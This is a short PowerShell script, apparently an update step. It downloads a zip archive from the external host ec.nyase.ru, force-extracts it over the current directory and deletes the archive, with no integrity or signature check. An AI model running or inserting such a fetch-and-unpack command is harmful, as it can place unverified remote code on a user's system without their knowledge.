$ErrorActionPreference = 'Stop';
$TempFile = (New-Guid).toString() + '.zip';
Invoke-WebRequest -Uri https://ec.nyase.ru/update.zip -OutFile $TempFile;
Expand-Archive -Path $TempFile -DestinationPath . -Force;
Remove-Item $TempFile;